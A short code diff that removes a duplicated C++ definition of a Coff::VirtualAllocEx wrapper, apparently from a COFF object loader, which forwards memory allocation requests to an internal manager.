@@ -242,17 +242,6 @@ auto DECLFN Coff::VirtualAllocEx(
     return Self->Mm->Alloc( Address, Size, AllocType, Protect, Handle );
 }
 
-auto DECLFN Coff::VirtualAllocEx(
-    HANDLE Handle,
-    LPVOID Address, 
-    SIZE_T Size, 
-    DWORD  AllocType, 
-    DWORD  Protect
-) -> PVOID {
-    G_KHARON
-    return Self->Mm->Alloc( Address, Size, AllocType, Protect, Handle );
-}
-
 auto DECLFN Coff::VirtualProtect(
     LPVOID Address, 
     SIZE_T Size, 
